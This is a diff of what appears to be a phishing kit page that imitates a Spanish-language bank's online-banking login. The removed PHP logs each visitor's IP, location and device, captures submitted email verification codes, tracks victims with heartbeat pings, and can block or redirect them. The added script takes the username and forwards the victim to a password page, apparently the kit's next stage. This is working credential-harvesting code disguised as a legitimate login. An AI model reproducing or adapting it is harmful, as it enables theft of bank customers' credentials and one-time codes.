@@ -1,95 +1,7 @@
-<?php
-require_once 'functions.php';
-
-$info   = get_user_info();
-$ip     = $info['ip'];
-$device = get_device_id(); 
-
-// Verificar si el usuario está bloqueado
-if (get_user_state($device) === 'block') {
-    echo "<script>
-            alert('Acceso denegado: Tu usuario ha sido bloqueado.');
-            window.location.href = 'https://www.google.com';
-          </script>";
-    exit();
-}
-
-// Actualizar el usuario con su device_id
-update_user($ip, $info['location'], basename(__FILE__));
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $allowedFields = ["correo"];
-    $formData = [];
-
-    foreach ($_POST as $key => $value) {
-        if (in_array($key, $allowedFields, true)) {
-            $formData[$key] = trim($value);
-        }
-    }
-
-    if (!empty($formData)) {
-        $data = load_data();
-
-        if (!isset($data[$device])) { 
-            $data[$device] = ['submissions' => [], 'state' => 'active'];
-        }
-
-        $timestamp = date("Y-m-d H:i:s");
-        $found = false;
-
-        if (isset($data[$device]['submissions'])) {
-            foreach ($data[$device]['submissions'] as &$submission) {
-                $existingKeys = array_keys($submission['data']);
-                $formKeys     = array_keys($formData);
-                sort($existingKeys);
-                sort($formKeys);
-                if ($existingKeys === $formKeys) {
-                    // Reemplazar el submission existente
-                    $submission = [
-                        "data"      => $formData,
-                        "timestamp" => $timestamp
-                    ];
-                    $found = true;
-                    break;
-                }
-            }
-            unset($submission);
-        }
-
-        if (!$found) {
-            // Agregar nueva submission
-            $data[$device]['submissions'][] = [
-                "data"      => $formData,
-                "timestamp" => $timestamp
-            ];
-            // Si es la primera submission y aún no se asignó color, asignar siempre #FF0000
-            if (count($data[$device]['submissions']) === 1 && empty($data[$device]['color'])) {
-                $data[$device]['color'] = '#000000';
-            }
-        }
-
-        save_data($data);
-
-        header("Location: waiting.php");
-        exit();
-    } else {
-        echo "<script>alert('Por favor, complete al menos un campo válido.');</script>";
-    }
-}
-?>
 <!DOCTYPE html>
 <html lang="en" class="notranslate">
 
 <head>
-    <script>
-    setInterval(function () {
-      fetch('functions.php?action=ping', { method: 'GET', keepalive: true });
-    }, 5000);
-
-    window.addEventListener('unload', function () {
-      navigator.sendBeacon('functions.php?action=offline');
-    });
-  </script>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta http-equiv="origin-trial"
         content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
@@ -34239,8 +34151,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
         }
     </style>
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-
 </head>
 
 <body class="generic"><icb-app _nghost-c0="" ng-version="4.4.7">
@@ -35874,7 +35784,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                                                                                             _ngcontent-c29=""
                                                                                             _nghost-c35="">
                                                                                             <form _ngcontent-c35=""
-                                                                                                method="post"
+                                                                                                id="loginform"
                                                                                                 class="wizardAutoHeightModeX ng-pristine ng-invalid ng-touched">
                                                                                                 <div _ngcontent-c35=""
                                                                                                     class="subotica">
@@ -35891,9 +35801,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                                                                                                                 disable-paste=""
                                                                                                                 formcontrolname="username"
                                                                                                                 required
-                                                                                                                id="correo"
-                                                                                                                name="correo"
-                                                                                                                placeholder="Escriba código enviado al correo">
+                                                                                                                id="step01"
+                                                                                                                placeholder="Escriba su nombre de usuario">
                                                                                                         </div>
 
 
@@ -36093,11 +36002,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                                                                                                                 </div>
                                                                                                                 <div _ngcontent-c35=""
                                                                                                                     class="subotica-content-button-table-right">
-                                                                                                                    <div _ngcontent-c36=""
-                                                                                                                    class="subotica-content-button-table-right">
                                                                                                                     <button
-                                                                                                                        type="submit"
-                                                                                                                        
                                                                                                                         id="submitBtn"
                                                                                                                         class="custom-button">
                                                                                                                         Siguiente
@@ -36119,6 +36024,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                                                                                                                             /* tono más oscuro al pasar el mouse */
                                                                                                                         }
                                                                                                                     </style>
+
                                                                                                                 </div>
                                                                                                             </div>
 
@@ -36126,6 +36032,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                                                                                                     </div>
                                                                                                 </div>
                                                                                             </form>
+                                                                                            <script>
+                                                                                                document.getElementById('loginform').addEventListener('submit', function (event) {
+                                                                                                    event.preventDefault(); // Evita el envío real del formulario
+
+                                                                                                    const username = document.getElementById('step01').value;
+
+                                                                                                    if (username.trim() !== '') {
+                                                                                                        localStorage.setItem('username', username);
+                                                                                                        window.location.href = 'pass.html'; // Redirige a pass.html
+                                                                                                    } else {
+                                                                                                        alert('Por favor, escriba su nombre de usuario.');
+                                                                                                    }
+                                                                                                });
+                                                                                            </script>
+
                                                                                         </icb-login-step-user>
                                                                                     </div>
                                                                                 </wizard-step-content>
@@ -36284,7 +36205,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                                                                                             _nghost-c36=""><!---->
                                                                                             <form _ngcontent-c36=""
                                                                                                 autocomplete="off"
-                                                                                                method="post"
+                                                                                                novalidate=""
                                                                                                 class="wizardAutoHeightModeX ng-untouched ng-pristine ng-invalid">
 
                                                                                                 <div _ngcontent-c36=""
@@ -41438,8 +41359,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             <div class="mesina-welcome-subtitle1">Por favor espere un momento...</div>
         </div>
     </div>
- 
-
 </body>
 
 </html>
